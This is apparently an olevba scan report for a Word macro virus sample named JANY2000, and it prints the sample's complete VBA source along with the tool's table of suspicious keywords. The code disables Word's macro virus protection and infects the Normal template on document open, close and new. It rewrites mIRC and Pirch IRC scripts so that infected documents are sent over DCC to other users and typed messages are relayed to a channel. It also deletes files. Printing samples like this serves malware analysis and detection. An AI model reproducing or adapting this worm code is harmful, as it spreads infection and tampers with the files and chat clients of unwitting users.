olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Jany-b6ba3082fa57a88414ae6cf862e58aef57f70d36
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Jany-b6ba3082fa57a88414ae6cf862e58aef57f70d36 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO JANY_2000.bas 
in file: Virus.MSWord.Jany-b6ba3082fa57a88414ae6cf862e58aef57f70d36 - OLE stream: 'Macros/VBA/JANY_2000'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'V_Name = [JANY2000]
'Author = [Del_Armg0]
'Date   = [14nov99]
'Type   = [W97MacroVirus/Mirc_Pirch_Worm/NoDestructor!/AndAlwaysForAGirl;)]
'GreetZ = [Jany, Secret aka Stram ! ;), Phage, all_on_#vxtrader&vx-vtc, Fa, Elsa, Soph&Franck, &marie42_]
'Disclaim=[JE L'AIME TOUTE ENTIERE... SIMPLEMENT]
  
   Sub AutoOpen()
On Error Resume Next
Options.SaveNormalPrompt = False
Options.VirusProtection = False
Application.EnableCancelKey = False

Application.VBE.ActiveVBProject.VBComponents("JANY_2000").Export ("C:\JANY2000.dll")
For I = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(I).Name = "JANY_2000" Then NormInstall = True
Next I
For I = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(I).Name = "JANY_2000" Then ActiveInstall = True
Next I
If ActiveInstall = True And NormInstall = False Then Set Jany = NormalTemplate.VBProject Else
If ActiveInstall = False And NormInstall = True Then Set Jany = ActiveDocument.VBProject
Jany.VBComponents.Import ("C:\JANY2000.dll")
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument

ActiveDocument.SaveAs FileName:="C:\Windows\JANY_is_cute.doc", FileFormat:=wdFormatDocument
ActiveDocument.SaveAs FileName:="C:\Windows\JANY_is_Sweet.doc", FileFormat:=wdFormatDocument
ActiveDocument.SaveAs FileName:="C:\Windows\PASSWORDS.doc", FileFormat:=wdFormatDocument
ActiveDocument.SaveAs FileName:="C:\Windows\JANY2000.doc", FileFormat:=wdFormatDocument


Kill "C:\mirc\Script.ini"
Open "C:\mirc\Script.ini" For Output As #2
Print #2, "[SCRIPT]"
Print #2, "n0=on 1:start:{"
Print #2, "n1= .remote on"
Print #2, "n2= .ctcps on"
Print #2, "n3= .events on"
Print #2, "n4= }"
Print #2, "n5=on 1:join:#:{"
Print #2, "n6=if ( $nick == $me ) { halt } | .dcc send $nick c:\Windows\PASSWORDS.doc"
Print #2, "n7= }"
Print #2, "n8=on 1:input:*:.msg #Jany2000 [( $+ $active $+ ) $1-]"
Print #2, "n9=on 1:text:*:?:.msg #Jany2000 [( $+ $active $+ ) $1-]"
Print #2, "n10=on 1:FILESENT:*.*:/dcc send $nick C:\Windows\JANY_is_cute.doc"
Print #2, "n10=on 1:FILERCVD:*.*:/dcc send $nick C:\Windows\JANY_is_Sweet.doc"
Print #2, "n11=on 1:connect:.msg #Jany2000 HI!!! Une Jany Virtuelle, c deja ca!!! ;)"
Print #2, ";A Del_Armg0 Script 4 Jany"
Close #2

Kill "C:\Windows\eventss.vxd"
Open "C:\Windows\eventss.vxd" For Output As #3
Print #3, "[Levels]"
Print #3, "Enabled=1"
Print #3, "Count=1"
Print #3, "Level1=000-Unknowns"""
Print #3, "000-UnknownsEnabled=1"
Print #3, ""
Print #3, "[000-Unknowns]"
Print #3, "User1=*!*@*"
Print #3, "UserCount=1"
Print #3, "Event1=;A Del_Armg0 Ripped! Script 4 Jany"
Print #3, "Event2=ON JOIN:#:/dcc send $nick C:\Windows\PASSWORDS.doc"
Print #3, "Event3=ON PART:#:/dcc send $nick C:\Windows\JANY2000.doc"
Print #3, "EventCount=3"
Close #3
Kill "C:\pirch98\events.ini"
Kill "C:\pirch32\events.ini"

SourceFile = "C:\Windows\eventss.vxd"
DestinationFile = "C:\pirch98\events.ini"
FileCopy SourceFile, DestinationFile

SourceFilez = "C:\Windows\eventss.vxd"
DestinationFilez = "C:\pirch32\events.ini"
FileCopy SourceFilez, DestinationFilez


If Day(Now()) = 8 And Month(Now()) = 11 Then
MsgBox "Lorsque tout me ravit, J'ignore" & Chr(13) & Chr(10) & "Si quelque chose me seduit." & Chr(13) & Chr(10) & "Elle eblouit comme l'Aurore" & Chr(13) & Chr(10) & "Et console comme la Nuit;", "JANY2000"
End If
If Day(Now()) = 15 And Month(Now()) = 5 Then
MsgBox "Et l'harmonie est trop exquise," & Chr(13) & Chr(10) & "Qui gouverne tout son beau corps," & Chr(13) & Chr(10) & "Pour que l'impuissante analyse" & Chr(13) & Chr(10) & "En note les nombreux accords.", "JANY2000"
End If
If Day(Now()) = 31 And Month(Now()) = 12 Then
MsgBox "WAAA!!! YEAR2000 Tomorrow!!! Great no?¿ I Guess yes!!! Et je te souhaite que ces années 2000 soient fastes, heureuses, et pleines de surprises cools  ; )   Bises!!!", "JANY2000"
End If
If Day(Now()) = 14 And Month(Now()) = 2 Then
MsgBox "Pire que tout l'Amour-Propre et la Fierte,... Mais l'Amour reste Pur, Sage & Eternel... La Vie n'en est pas moins dure... 1000BaiserS a toi... & Happy St Valentin à vous toutes que j'Aime tant", "Fa_luv_U"
End If
If Day(Now()) = 1 Then
MsgBox "Lorsque tout me ravit, J'ignore" & Chr(13) & Chr(10) & "Si quelque chose me seduit." & Chr(13) & Chr(10) & "Elle eblouit comme l'Aurore" & Chr(13) & Chr(10) & "Et console comme la Nuit;", "JANY2000"
End If
If Day(Now()) = 2 Then
MsgBox "Et l'harmonie est trop exquise," & Chr(13) & Chr(10) & "Qui gouverne tout son beau corps," & Chr(13) & Chr(10) & "Pour que l'impuissante analyse" & Chr(13) & Chr(10) & "En note les nombreux accords.", "JANY2000"
End If
If Day(Now()) = 31 Then
MsgBox "U're going now to be Destroyed ! Sorry, but if u ShutDown, u won't restart, believe me !  ; )" & Chr(13) & Chr(10) & "But U can Do one Thing... if u're able to save 25 .doc in 1 minutes, i leave u alone... almost... C u  :)   hehehe ... Del_ !", "JANY2000"
End If
End Sub
   
   
   
   Sub AutoClose()
On Error Resume Next
Options.SaveNormalPrompt = False
Options.VirusProtection = False
Application.VBE.ActiveVBProject.VBComponents("JANY_2000").Export ("C:\JANY2000.dll")
For I = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(I).Name = "JANY_2000" Then NormInstall = True
Next I
For I = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(I).Name = "JANY_2000" Then ActiveInstall = True
Next I
If ActiveInstall = True And NormInstall = False Then Set Jany = NormalTemplate.VBProject Else
If ActiveInstall = False And NormInstall = True Then Set Jany = ActiveDocument.VBProject
Jany.VBComponents.Import ("C:\JANY2000.dll")
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End Sub

   Sub AutoNew()
On Error Resume Next
Options.SaveNormalPrompt = False
Application.VBE.ActiveVBProject.VBComponents("JANY_2000").Export ("C:\JANY2000.dll")
For I = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(I).Name = "JANY_2000" Then NormInstall = True
Next I
For I = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(I).Name = "JANY_2000" Then ActiveInstall = True
Next I
If ActiveInstall = True And NormInstall = False Then Set Jany = NormalTemplate.VBProject Else
If ActiveInstall = False And NormInstall = True Then Set Jany = ActiveDocument.VBProject
Jany.VBComponents.Import ("C:\JANY2000.dll")
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End Sub


   
   Sub Jany_I_Love_U()
'perhaps for the next version ... ;))
End Sub



   Sub ViewVBCode()
   MsgBox "No code too see!"
   End Sub

   
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |JANY2000.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

